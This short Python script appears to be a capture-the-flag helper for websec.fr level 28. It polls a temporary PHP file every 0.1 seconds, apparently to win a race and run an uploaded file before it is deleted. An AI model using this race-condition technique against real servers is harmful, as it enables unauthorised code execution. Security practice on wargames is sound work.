#!/usr/bin/env python3
import requests
import time

URL = "https://websec.fr/level28/tmp/"
FILE = "f7cf4c2833f5b38bd6581f5b4fea2572.php"

while True:
    res = requests.get(f"{URL}/{FILE}")
    if res.status_code != 404:
        print(res.text)
    else:
        print("NOPE")
    time.sleep(0.1)